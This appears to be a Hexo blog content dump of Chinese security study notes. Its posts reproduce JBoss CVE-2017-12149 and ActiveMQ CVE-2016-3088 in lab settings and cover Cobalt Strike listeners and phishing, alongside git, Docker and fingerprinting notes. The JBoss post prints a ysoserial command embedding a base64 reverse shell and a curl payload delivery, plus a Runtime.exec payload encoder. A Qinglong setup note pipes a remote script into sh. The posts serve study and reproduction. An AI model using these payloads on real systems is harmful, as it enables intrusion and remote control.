关闭不需要的服务","categories":[],"tags":[]},{"title":"","slug":"JBoss5.x6.x反序列化漏洞","date":"2024-02-26T02:25:19.028Z","updated":"2022-04-08T17:21:59.426Z","comments":true,"path":"2024/02/26/JBoss5.x6.x反序列化漏洞/","permalink":"http://example.com/2024/02/26/JBoss5.x6.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"12345678910title: 漏洞复现学习（jboss5.x/6.x）tags: - 渗透测试 - 漏洞复现 - 反序列化漏洞 - (CVE-2017-12149)categories: - 渗透测试 - 漏洞复现 - (CVE-2017-12149) JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）复现学习该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。 漏洞概要 漏洞名称 JBOSSAS5.x&#x2F;6.x反序列化命令执行漏洞 威胁类型 远程命令执行 威胁等级 高 漏洞ID CVE-2017-12149 受影响系统及应用版本 Jboss AS 5.xJbossAS 6.x 漏洞环境1https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149 初始化 1docker-compose up -d 初始化完成后访问http://your-ip:8080/即可看到JBoss默认页面。 漏洞复现该漏洞出现在/invoker/readonly请求中，服务器将用户提交的POST内容进行了Java反序列化： 编写反弹shell的命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;title&gt;java.lang.Runtime.exec() Payload Workarounds - @Jackson_T&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt; &lt;!-- &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/main.css&quot; type=&quot;text/css&quot; /&gt; --&gt; &lt;style&gt;body &#123; margin: 0; padding: 10px 0; text-align: center; font-family: &#x27;Ubuntu Condensed&#x27;, sans-serif; color: #585858; background-color: #fff; font-size: 13px; line-height: 1.4&#125; ::selection &#123; background: #fff2a8;&#125;pre, code &#123; font-family: &#x27;Ubuntu Mono&#x27;, &#x27;Consolas&#x27;, Monospace; font-size: 13px; background-color: #E5F5E5; color: #585858; padding-left: 0.25em; padding-right: 0.25em; /*display: block;*/&#125; #wrap &#123; margin-left: 1em; margin-right: 1em; text-align: left; font-size: 13px; line-height: 1.4&#125; #wrap &#123; width: 820px; &#125; #container &#123; float: right; width: 610px; &#125;.entry &#123; font-size: 14px; line-height: 20px; hyphens: auto; font-family: &#x27;Roboto&#x27;, sans-serif, &#x27;Inconsolata&#x27;, Monospace;&#125;&lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;container&quot;&gt; &lt;div class=&quot;entry&quot;&gt; &lt;article&gt; &lt;p&gt;偶尔有时命令执行有效负载&lt;code&gt;Runtime.getRuntime().exec()&lt;/code&gt;失败. 使用 web shells, 反序列化漏洞或其他向量时可能会发生这种情况.&lt;/p&gt; &lt;p&gt;有时这是因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义. 例如 &lt;code&gt;ls &amp;gt; dir_listing&lt;/code&gt; 在shell中执行应该将当前目录的列表输出到名为的文件中 &lt;code&gt;dir_listing&lt;/code&gt;. 但是在 &lt;code&gt;exec()&lt;/code&gt; 函数的上下文中,该命令将被解释为获取 &lt;code&gt;&amp;gt;&lt;/code&gt; 和 &lt;code&gt;dir_listing&lt;/code&gt; 目录.&lt;/p&gt; &lt;p&gt;其他时候,其中包含空格的参数会被StringTokenizer类破坏.该类将空格分割为命令字符串. 那样的东西 &lt;code&gt;ls &amp;quot;My Directory&amp;quot;&lt;/code&gt; 会被解释为 &lt;code&gt;ls &#x27;&amp;quot;My&#x27; &#x27;Directory&amp;quot;&#x27;&lt;/code&gt;.&lt;/p&gt; &lt;p&gt;在Base64编码的帮助下, 下面的转换器可以帮助减少这些问题. 它可以通过调用Bash或PowerShell再次使管道和重定向更好,并且还确保参数中没有空格.&lt;/p&gt; &lt;p&gt;Input type: &lt;input type=&quot;radio&quot; id=&quot;bash&quot; name=&quot;option&quot; value=&quot;bash&quot; onclick=&quot;processInput();&quot; checked=&quot;&quot; /&gt;&lt;label for=&quot;bash&quot;&gt;Bash&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;powershell&quot; name=&quot;option&quot; value=&quot;powershell&quot; onclick=&quot;processInput();&quot; /&gt;&lt;label for=&quot;powershell&quot;&gt;PowerShell&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;python&quot; name=&quot;option&quot; value=&quot;python&quot; onclick=&quot;processInput();&quot; /&gt;&lt;label for=&quot;python&quot;&gt;Python&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;perl&quot; name=&quot;option&quot; value=&quot;perl&quot; onclick=&quot;processInput();&quot; /&gt;&lt;label for=&quot;perl&quot;&gt;Perl&lt;/label&gt;&lt;/p&gt; &lt;p&gt;&lt;textarea rows=&quot;10&quot; style=&quot;width: 100%; box-sizing: border-box;&quot; id=&quot;input&quot; placeholder=&quot;Type input here...&quot;&gt;&lt;/textarea&gt; &lt;textarea rows=&quot;5&quot; style=&quot;width: 100%; box-sizing: border-box;&quot; id=&quot;output&quot; onclick=&quot;this.focus(); this.select();&quot; readonly=&quot;&quot;&gt;&lt;/textarea&gt;&lt;/p&gt; &lt;script&gt; var taInput = document.querySelector(&#x27;textarea#input&#x27;); var taOutput = document.querySelector(&#x27;textarea#output&#x27;); function processInput() &#123; var option = document.querySelector(&#x27;input[name=&quot;option&quot;]:checked&#x27;).value; switch (option) &#123; case &#x27;bash&#x27;: taInput.placeholder = &#x27;Type Bash here...&#x27; taOutput.value = &#x27;bash -c &#123;echo,&#x27; + btoa(taInput.value) + &#x27;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;; break; case &#x27;powershell&#x27;: taInput.placeholder = &#x27;Type PowerShell here...&#x27; poshInput = &#x27;&#x27; for (var i = 0; i &lt; taInput.value.length; i++) &#123; poshInput += taInput.value[i] + unescape(&quot;%00&quot;); &#125; taOutput.value = &#x27;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc &#x27; + btoa(poshInput); break; case &#x27;python&#x27;: taInput.placeholder = &#x27;Type Python here...&#x27; taOutput.value = &quot;python -c exec(&#x27;&quot; + btoa(taInput.value) + &quot;&#x27;.decode(&#x27;base64&#x27;))&quot;; break; case &#x27;perl&#x27;: taInput.placeholder = &#x27;Type Perl here...&#x27; taOutput.value = &quot;perl -MMIME::Base64 -e eval(decode_base64(&#x27;&quot; + btoa(taInput.value) + &quot;&#x27;))&quot;; break; default: taOutput.value = &#x27;&#x27; &#125; if (!taInput.value) taOutput.value = &#x27;&#x27;; &#125; taInput.addEventListener(&#x27;input&#x27;, processInput, false);&lt;/script&gt; &lt;/article&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 通过上面的html进行bash 序列化数据生成使用ysoserial来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5： 1java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1My4xMjgvMjEgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser 生成好的POC即为poc.ser 发送POC使用burp或者通过二进制的方式post发送攻击载荷 通过二进制POST方式发送攻击载荷到 &#x2F;invoker&#x2F;readonly 1curl http://172.18.174.198:8080/invoker/readonly --data-binary @poc.ser 通过burp 将这个文件作为POST Body发送至&#x2F;invoker&#x2F;readonly即可： JBoss反序列化工具一键检测： 攻击方式攻击者只需要构造带有需要执行Payload的ser文件，然后使用curl将二进制文件提交至目标服务器的invoker&#x2F;readonly页面中，即可执行Payload中指定的命令，获取对电脑的控制权。攻击示例代码如下： &#x2F;&#x2F;编译预置payload的java文件 javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java &#x2F;&#x2F;反弹shell的IP和端口 java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 1.1.1.1:6666 &#x2F;&#x2F;使用curl向&#x2F;invoker&#x2F;readonly提交payload curl http://192.268.197.25:8080/invoker/readonly –data-binary @ReverseShellCommonsCollectionsHashMap.ser 修复方法 不需要 http-invoker.sar 组件的用户可直接删除此组件。 添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint 标签中，对 http invoker 组件进行访问控制： &#x2F;*","categories":[],"tags":[]},{"title":"hexo+GitHub搭建博客","slug":"hexo搭建博客笔记","date":"2024-02-26T02:25:19.026Z","updated":"2022-04-08T16:54:05.356Z","comments":true,"path":"2024/02/26/hexo搭建博客笔记/","permalink":"http://example.com/2024/02/26/hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%AC%94%E8%AE%B0/","excerpt":"","text":"hexo和github搭建博客安装 Hexo、git Node.js 官网下载地址：https://nodejs.org/en/download/ Git 官网下载地址：https://git-scm.com/downloads 12$ npm install hexo-cli -g$ npm install hexo-deployer-git --save hexo初始化在刚才新建的文件夹里面再次新建一个 Hexo 文件夹,进入该 Hexo 文件夹右键鼠标，点击 Git Bash Here，输入以下命令，如图所示则安装成功 1hexo init 本地查看这里一定是 http://localhost:4000/ 有的浏览器默认打开的https的需要注意，显示失败 1hexo generate 1hexo server github部署仓库 注册 Github 账户：点击此处访问 Github 官网，点击 Sign Up 注册账户 创建项目代码库：点击 New repository 开始创建 配置 SSH 密钥：只有配置好 SSH 密钥后，我们才可以通过 git 操作实现本地代码库与 Github 代码库同步，在你第一次新建的文件夹里面 12$ ssh-keygen -t rsa -C &quot;your email@example.com&quot;//引号里面填写你的邮箱地址 123Generating public/private rsa key pair.Enter file in which to save the key (/c/Users/you/.ssh/id_rsa)://到这里可以直接回车将密钥按默认文件进行存储 123Enter passphrase (empty for no passphrase)://这里是要你输入密码，其实不需要输什么密码，直接回车就行Enter same passphrase again: 123456Your identification has been saved in /c/Users/you/.ssh/id_rsa.Your public key has been saved in /c/Users/you/.ssh/id_rsa.pub.The key fingerprint is:这里是各种字母数字组成的字符串，结尾是你的邮箱The key&#x27;s randomart image is:这里也是各种字母数字符号组成的字符串 可以寻找本地C盘用户下存储的.ssh下的id_rsa.pub 将自己生成的公钥id_rsa.pub内容复制添加到github 测试 输入以下命令：注意：git@github.com不要做任何更改！ 配置个人信息 12git config --global user.name &quot;此处填你的用户名&quot;git config --global user.email &quot;此处填你的邮箱&quot; 将hexo部署到github 找到自己的仓库复制ssh 1git@github.com:xxxxx/xxxxx.github.io.git 将ssh复制到本地的_config.yml 1234567# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy: type: git repository: git@github.com:16778738/16778738.github.io.git branch: master 在 Hexo 文件夹下分别执行以下命令 1hexo g -d 执行完之后会让你输入你的 Github 的账号和密码，如果此时报以下错误，说明你的 deployer 没有安装成功 1ERROR Deployer not found: git 需要执行以下命令再安装一次： 1npm install hexo-deployer-git --save 访问博客你的博客地址：https:&#x2F;&#x2F;你的用户名.github.io 点击此处进入 Hexo 官网的主题专栏 找到自己喜欢的，克隆他的模板 Github 上的地址 打开 Hexo 文件夹下的 themes 目 录右键 Git Bash Here，输入以下命令： 1$ git clone 此处填写你刚才复制的主题地址 等待下载完成后即可在 themes 目录下生成 hexo-theme-aero-dual 文件夹，然后打开 Hexo 文件夹下的配置文件 _config.yml ，找到关键字 theme，修改参数为：theme：hexo-theme-aero-dual （其他主题修改成相应名称即可），再次注意冒号后面有一个空格！ 123$ hexo clean //该命令的作用是清除缓存，若不输入此命令，服务器有可能更新不了主题$ hexo g -d","categories":[{"name":"hexo","slug":"hexo","permalink":"http://example.com/categories/hexo/"},{"name":"github","slug":"hexo/github","permalink":"http://example.com/categories/hexo/github/"},{"name":"博客","slug":"hexo/github/博客","permalink":"http://example.com/categories/hexo/github/%E5%8D%9A%E5%AE%A2/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://example.com/tags/hexo/"},{"name":"github","slug":"github","permalink":"http://example.com/tags/github/"},{"name":"博客","slug":"博客","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2/"}]},{"title":"git学习","slug":"git命令","date":"2024-02-26T02:25:19.024Z","updated":"2022-04-08T16:52:58.523Z","comments":true,"path":"2024/02/26/git命令/","permalink":"http://example.com/2024/02/26/git%E5%91%BD%E4%BB%A4/","excerpt":"","text":"git add . （注意后边有个 . ） 把修改的部分全部选中，你也可以不用 . ，修改那个选中哪个，一般都是全部选中的git commit -m”提交时提交的备注” 这一步是把刚才选中的东西提交到暂存区域，暂存区域是在你本地，并不在远程git push 解决完冲突之后，就需要把你的暂存区域代码提交到远程仓库了。解决冲突之后运行这一步即可，然后远程仓库就可以看到你的代码修改了git checkout -b local_branch_name origin&#x2F;remote_branch_name &#x2F;&#x2F; 在本地基于远程的 remote_barnch_name 新建一个 local_branch_name 分支git push origin local_branch_name &#x2F;&#x2F; 把本地分支推到远程 git branch –set-upstream-to&#x3D;origin&#x2F;local_branch_name &#x2F;&#x2F; 绑定远程分支 git pull –prune &#x2F;&#x2F; 拉取所有远程分支的改动，包括新创建的分支 –prune 刷新本地分支缓存，会清除掉本地已经删除的分支名称 git checkout local_branch_name &#x2F;&#x2F; 直接切换分支 git branch –set-upstream-to&#x3D;origin&#x2F;local_branch_name &#x2F;&#x2F; 分支绑定 git status 常看仓库的状态， git diff 常看git中文件的修改和改动 git init 初始化仓库，这个一般只在刚开始使用 git clone 仓库地址 本地目录 把远程仓库的代码克隆到本地 git add 把修改的文件添加到本地暂存区， git commit -m ‘提交信息’ 把本地暂存区的代码提交到本地版本仓库 git push origin 本地分支:远程分支 把本地分支推送到远程 git branch 查看本地分支列表 git branch -r 查看远程分支列表 git branch 分支名 源分支名 创建一个新分支默认是当前分支 git checkout 分支名 切换分支 git checkout -b 分支名 创建并且切换一个分支 git fetch 更新远程仓库分支信息到本地 git merge 分支名 合并指定分支到当前分支 git pull 更新分支信息并合并当前分支的源分支到当前分支 git log 查看分支的提交日志记录 gitk –all 查看提交信息","categories":[{"name":"git","slug":"git","permalink":"http://example.com/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"http://example.com/tags/git/"}]},{"title":"FUZZ学习","slug":"fuzz","date":"2024-02-26T02:25:19.023Z","updated":"2022-04-08T16:51:51.534Z","comments":true,"path":"2024/02/26/fuzz/","permalink":"http://example.com/2024/02/26/fuzz/","excerpt":"","text":"FUZZ什么是Fuzz技术?1Fuzz是一种基于黑盒的自动化软件模糊测试技术,简单的说一种懒惰且暴力的技术融合了常见的以及精心构建的数据文本进行网站、软件安全性测试; Fuzz的核心思想: 目录Fuzz(漏洞点) 参数Fuzz(可利用参数) PayloadFuzz(bypass) 针对一部分网站可以扫描的全面，只要你的字典足够强大就可以扫描到绝大多部分的目录和文件 应用场景 爆破敏感目录 敏感文件可利用参数 fuzz参数来达到Jsonp劫持以及XSS漏洞等等; 越权验证信息 FBypass SQL injection Bypass Open redirect XSS Fuzzer 常用工具 御剑: 界面化目录和文件扫描 Dirsearch : 扫描模式和dirbuster是差不多 Nikto : 作用在于目录的爆破 wfuzz : 可以进行web应用暴力猜解，也支持对网站目录，登录信息，应用资源文件等的暴力猜解，还可以进行get及post参数的猜解，sql注入，xss漏洞的测试等。该工具所有功能都依赖于字典 burp插件CO2: Sqlmapper模块","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"","slug":"Docker01","date":"2024-02-26T02:25:19.021Z","updated":"2022-04-08T17:23:38.286Z","comments":true,"path":"2024/02/26/Docker01/","permalink":"http://example.com/2024/02/26/Docker01/","excerpt":"","text":"12345title: Docker学习笔记tags: - Dockercategories: - Docker Docker命令学习笔记构建并运行漏洞环境 1docker-compose up -d 容器列出所有的容器1docker ps -a 列出所有的容器 ID1docker ps -aq 杀死所有的容器1docker kill $(docker ps -aq) 停止所有的容器1docker stop $(docker ps -aq) 删除所有的容器1docker rm $(docker ps -aq) 停止所有异常的容器1docker ps -a | grep &quot;Exited&quot; | awk &#x27;&#123;print $1&#125;&#x27; | xargs docker stop 删除所有异常停止的容器1docker ps -a | grep &quot;Exited&quot; | awk &#x27;&#123;print $1&#125;&#x27; | xargs docker rm 镜像通过标签删除镜像通过如下两个都可以删除镜像： 1docker rmi [image] 或者： 1docker image rm [image] 支持的子命令如下： -f, -force: 强制删除镜像，即便有容器引用该镜像； -no-prune: 不要删除未带标签的父镜像； 通过 ID 删除镜像除了通过标签名称来删除镜像，我们还可以通过指定镜像 ID, 来删除镜像，如： 1docker rmi b7b28af77ffe 批量删除无 tag 标签镜像在 Docker 构建镜像过程产生的临时镜像，或者遗留下来的垃圾镜像，可以通过以下命令删除。 123docker ps -a|grep &quot;Exited&quot; | awk &#x27;&#123;print $1&#125;&#x27; | xargs docker stopdocker ps -a|grep &quot;Exited&quot; | awk &#x27;&#123;print $1&#125;&#x27; | xargs docker rmdocker images|grep none|awk &#x27;&#123;print $3&#125;&#x27;|xargs docker rmi 删除所有镜像1docker rmi $(docker images -q) 清理镜像我们在使用 Docker 一段时间后，系统一般都会残存一些临时的、没有被使用的镜像文件，可以通过以下命令进行清理： 1docker image prune 它支持的子命令有： -a, --all: 删除所有没有用的镜像，而不仅仅是临时文件； -f, --force：强制删除镜像文件，无需弹出提示确认；","categories":[],"tags":[]},{"title":"Cobalt Strike","slug":"docker","date":"2024-02-26T02:25:19.020Z","updated":"2022-04-08T16:50:45.850Z","comments":true,"path":"2024/02/26/docker/","permalink":"http://example.com/2024/02/26/docker/","excerpt":"","text":"Docker端口映射启动容器时，选择一个端口映射到容器内部开放端口上-p 小写p表示docker会选择一个具体的宿主机端口映射到容器内部开放的网络端口上。-P 大写P表示docker会随机选择一个宿主机端口映射到容器内部开放的网络端口上。 启动创建时，绑定外部的ip和端口 容器启动时可以指定通信协议，比如tcp、udp 查看容器绑定和映射的端口及Ip地址 容器启动绑定多IP和端口（跟多个-p） 容器除了在启动时添加端口映射关系，还可以通过宿主机的iptables进行nat转发，将宿主机的端口映射到容器的内部端口上，这种方式适用于容器启动时没有指定端口映射的情况！","categories":[{"name":"Docker","slug":"Docker","permalink":"http://example.com/categories/Docker/"}],"tags":[{"name":"Docker端口映射","slug":"Docker端口映射","permalink":"http://example.com/tags/Docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/"},{"name":"Docker","slug":"Docker","permalink":"http://example.com/tags/Docker/"}]},{"title":"Cobalt Strike","slug":"CobaltStrike","date":"2024-02-26T02:25:19.010Z","updated":"2022-04-08T17:24:58.810Z","comments":true,"path":"2024/02/26/CobaltStrike/","permalink":"http://example.com/2024/02/26/CobaltStrike/","excerpt":"","text":"Cobalt StrikeCS是什么？ 1234567Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。早期版本Cobalt Srtike依赖Metasploit框架，而现在Cobalt Strike已经不再使用MSF而是作为单独的平台使用。这个工具的社区版是大家熟知的Armitage(一个MSF的图形化界面工具)，而Cobalt Strike大家可以理解其为Armitage的商业版。 开启服务器1teamserver your_ip your_passowrd [config_file] 创建监听器 在CS客户端中打开 Cobalt Strike —》Listeners，之后点击Add，此时弹出New Listener窗口，在填写监听器的相关信息之前，需要先来了解监听器有哪些类型。 Cobalt Strike有两种类型的监听器： Beacon Beacon直译过来就是灯塔、信标、照亮指引的意思，Beacon是较为隐蔽的后渗透代理，Beacon监听器的名称例如： 1windows/beacon_http/reverse_http Foreign Foreign直译就是外部的，这里可以理解成对外监听器，这种类型的监听器主要作用是给其他的Payload提供别名，比如Metasploit 框架里的Payload，笔者个人理解Foreign监听器在一定程度上提高了CS的兼容性。 MSF 与 CS 的结合利用如果想使用MSF对目标进行漏洞利用，再通过这个漏洞来传输Beacon的话，也是可以的。 1、首先在MSF上选择攻击模块 2、接着在MSF上设置Payload为windows/meterpreter/reverse_http或者windows/meterpreter/reverse_https，这么做是因为CS的Beacon与MSF的分阶段协议是相兼容的。 3、之后在MSF中设置Payload的LHOST、LPORT为CS中Beacon的监听器IP及端口。 4、然后设置 DisablePayloadHandler 为 True，此选项会让 MSF 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉MSF说我们已经建立了监听器，不必再新建监听器了。 5、再设置 PrependMigrate 为 True，此选项让 MSF 前置 shellcode 在另一个进程中运行 payload stager。如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。 6、最后运行exploit -j，-j 是指作为job开始运行，即在后台运行。 鱼叉式网络钓鱼用CS进行钓鱼需要四个步骤： 1、创建一个目标清单 2、制作一个邮件模板或者使用之前制作好的模板 3、选择一个用来发送邮件的邮件服务器 4、发送邮件","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"内网安全","slug":"渗透测试/内网安全","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Cobalt Strike","slug":"Cobalt-Strike","permalink":"http://example.com/tags/Cobalt-Strike/"},{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"","slug":"ActiveMQ任意文件写入","date":"2024-02-26T02:25:19.004Z","updated":"2022-04-08T17:23:01.297Z","comments":true,"path":"2024/02/26/ActiveMQ任意文件写入/","permalink":"http://example.com/2024/02/26/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/","excerpt":"","text":"1234567891011title: 漏洞复现学习(ActiveMQ)tags: - 渗透测试 - 漏洞复现 - ActiveMQ - (CVE-2016-3088)categories: - 渗透测试 - ActiveMQ - 漏洞复现 - (CVE-2016-3088) ActiveMQ任意文件写入漏洞 (CVE-2016-3088)学习漏洞描述 影响版本：Apache ActiveMQ 5.x~5.14.0 漏洞产生原因：ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。 环境部署使用win10子系统的Ubuntu安装docker 查看版本信息 1http://host:8161/admin/index.jsp?printable=true 漏洞利用 首先访问网址查看ActiveMQ的绝对路径： 1http://127.0.0.1:8161/admin/test/systemProperties.jsp 然后使用burp进行put，webshell get访问&#x2F;fileserver&#x2F;3.txt，将burp拦截的请求进行重构repeater 替换信息，写入有webshell的txt文本 移动到web目录下的api文件夹（/opt/activemq/webapps/api/s.jsp）中： 1Destination:file:///opt/activemq/webapps/api/5.jsp 网站进行访问查看api&#x2F;下是否存在webshell 进行访问： 修复方案1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。 2、通过移除 conf\\jetty.xml 的以下配置来禁用 ActiveMQ Fileserver 功能 3、打补丁 http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt 4、电脑管家等修复漏洞工具","categories":[],"tags":[]},{"title":"","slug":"青龙学习","date":"2024-02-26T01:22:49.805Z","updated":"2024-03-15T08:06:19.330Z","comments":true,"path":"2024/02/26/青龙学习/","permalink":"http://example.com/2024/02/26/%E9%9D%92%E9%BE%99%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"青龙部署12345678910111213141516171819202122232425安装拉取青龙镜像的docker pull whyour/qinglong:latest输入 docker ps查看 青龙 Docker 是否正常运行，记下青龙 Docker的容器名字 ，然后进入下一步。Docker输入一键安装命令，如果你的青龙容器不叫 qinglong，需要替换为相应的容器名字（国外鸡，可以使用上面的国外脚本，速度比较快）： docker exec -it qinglong bash -c &quot;$(curl -fsSL https://ghproxy.com/https://raw.githubusercontent.com/FlechazoPh/QLDependency/main/Shell/QLOneKeyDependency.sh | sh)&quot;查看输出日志： SSH等进度条走完，等待的时候因机器性能而异，性能差有的时间可能会非常长...npm最后输出，就完成了，重启下青龙 Docker ：Docker restart qinglong依赖安装完毕...","categories":[],"tags":[]},{"title":"","slug":"Web指纹识别技术研究与优化实现","date":"2024-02-26T01:22:49.790Z","updated":"2021-08-20T03:31:59.000Z","comments":true,"path":"2024/02/26/Web指纹识别技术研究与优化实现/","permalink":"http://example.com/2024/02/26/Web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6%E4%B8%8E%E4%BC%98%E5%8C%96%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"本文作者：TIde安全团队重剑无锋，转载请申明出处。https://github.com/TideSec/TideFinger 本文通过分析web指纹的检测对象、检测方法、检测原理及常用工具，设计了一个简易的指纹搜集脚本来协助发现新指纹，并提取了多个开源指纹识别工具的规则库并进行了规则重组，开发了一个简单快捷的指纹识别小工具TideFinger，并实现了一套在线的指纹识别平台“潮汐指纹”，希望能为大家带来方便。 前言在web渗透过程中，Web指纹识别是信息收集环节中一个比较重要的步骤，通过一些开源的工具、平台或者手工检测CMS系统是公开的CMS程序还是二次开发至关重要，能准确的获取CMS类型、Web服务组件类型及版本信息可以帮助安全工程师快速有效的去验证已知漏洞。 1在指纹识别的学习过程中，借用了很多开源的工具和指纹库，如fofa、WhatWeb、w11scan、WebEye、御剑等等，在此感谢各种大佬的无私奉献。本文并无技术上的创新和突破，只是把一些指纹库重新进行了整合和梳理并进行了开源。 tips：文末有福利我们将搜集到的一些指纹工具、指纹库等资料打包供大家下载 常见指纹检测的对象1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等； 2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等； 3、Web服务器：比如Apache、lighttpd, Nginx, IIS等； 4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等； 5、开发语言：比如PHP、Java、Ruby、Python、C#等； 6、操作系统信息：比如linux、win2k8、win7、kali、centos等； 7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等； 8、WAF信息：是否使用waf，如Topsec、Jiasule、Yundun等； 9、IP及域名信息：IP和域名注册信息、服务商信息等； 10、端口信息：有些软件或平台还会探测服务器开放的常见端口。 常见的指纹识别方式1、特定文件的MD5 一些网站的特定图片文件、js文件、CSS等静态文件，如favicon.ico、css、logo.ico、js等文件一般不会修改，通过爬虫对这些文件进行抓取并比对md5值，如果和规则库中的Md5一致则说明是同一CMS。这种方式速度比较快，误报率相对低一些，但也不排除有些二次开发的CMS会修改这些文件。 2、正常页面或错误网页中包含的关键字 先访问首页或特定页面如robots.txt等，通过正则的方式去匹配某些关键字，如Powered by Discuz、dedecms等。 或者可以构造错误页面，根据报错信息来判断使用的CMS或者中间件信息，比较常见的如tomcat的报错页面。 3、请求头信息的关键字匹配 根据网站response返回头信息进行关键字匹配，whatweb和Wappalyzer就是通过banner信息来快速识别指纹，之前fofa的web指纹库很多都是使用的这种方法，效率非常高，基本请求一次就可以，但搜集这些规则可能会耗时很长。而且这些banner信息有些很容易被改掉。 根据response header一般有以下几种识别方式： 查看http响应报头的X-Powered-By字段来识别； 根据Cookies来进行判断，比如一些waf会在返回头中包含一些信息，如360wzws、Safedog、yunsuo等； 根据header中的Server信息来判断，如DVRDVS-Webs、yunjiasu-nginx、Mod_Security、nginx-wallarm等； 根据WWW-Authenticate进行判断，一些路由交换设备可能存在这个字段，如NETCORE、huawei、h3c等设备。 4、部分URL中包含的关键字，比如wp-includes、dede等URL关键特征 通过规则库去探测是否有相应目录，或者根据爬虫结果对链接url进行分析，或者对robots.txt文件中目录进行检测等等方式，通过url地址来判别是否使用了某CMS，比如wordpress默认存在wp-includes和wp-admin目录，织梦默认管理后台为dede目录，solr平台可能使用&#x2F;solr目录，weblogic可能使用wls-wsat目录等。 5、开发语言的识别 web开发语言一般常见的有PHP、jsp、aspx、asp等，常见的识别方式有： 通过爬虫获取动态链接进行直接判断是比较简便的方法。 asp判别规则如下&lt;a[^&gt;]*?href=(&#39;|&quot;)[^http][^&gt;]*?\\.asp(\\?|\\#|\\1)，其他语言可替换相应asp即可。 通过X-Powered-By进行识别 比较常见的有X-Powered-By: ASP.NET或者X-Powered-By: PHP/7.1.8 通过Set-Cookie进行识别 这种方法比较常见也很快捷，比如Set-Cookie中包含PHPSSIONID说明是php、包含JSESSIONID说明是java、包含ASP.NET_SessionId说明是aspx等。 指纹识别工具在研究指纹识别技术的时候，不可避免的分析了大量指纹识别工具，在此将自己用过的几个感觉不错的工具和平台介绍一下。 国外指纹识别工具WhatWeb（推荐指数★★★★★）下载地址：https://github.com/urbanadventurer/WhatWeb Whatweb 